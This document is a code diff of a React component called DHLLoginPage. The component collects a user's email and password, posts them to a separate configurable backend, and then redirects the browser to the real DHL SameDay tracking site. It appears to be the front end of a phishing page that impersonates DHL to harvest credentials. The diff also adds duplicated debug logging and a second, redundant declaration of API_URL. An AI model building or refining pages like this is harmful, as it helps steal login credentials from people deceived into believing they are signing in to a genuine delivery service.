@@ -2,7 +2,12 @@ import React, { useState } from "react";
 import "./App.css";
 
 // ✅ Use only one fallback
+// Correct
 const API_URL = process.env.REACT_APP_API_URL || "http://localhost:5000";
+
+
+console.log("✅ API URL used:", API_URL);
+console.log("✅ API URL used:", API_URL);
 
 
 const DHLLoginPage = () => {
@@ -25,12 +30,17 @@ const DHLLoginPage = () => {
   ];
 
   // ✅ Handle login
- const handleLogin = async () => {
-  if (!email || !password) return alert("Email and password required");
-  setIsLoading(true);
+const API_URL = process.env.REACT_APP_API_URL || "http://localhost:5000";
 
+const handleLogin = async () => {
+  if (!email || !password) return alert("Email and password required");
+  
+  setIsLoading(true);
   try {
-    const response = await fetch(`${API_URL}/login`, {
+    const url = `${API_URL}/login`;
+    console.log("Fetching URL:", url); // Make sure URL is correct
+
+    const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ email, password }),
@@ -44,7 +54,6 @@ const DHLLoginPage = () => {
     }
 
     const data = await response.json();
-
     if (data.success) {
       window.location.href = "https://www.dhlsameday.com/SkyTracking/";
     } else {
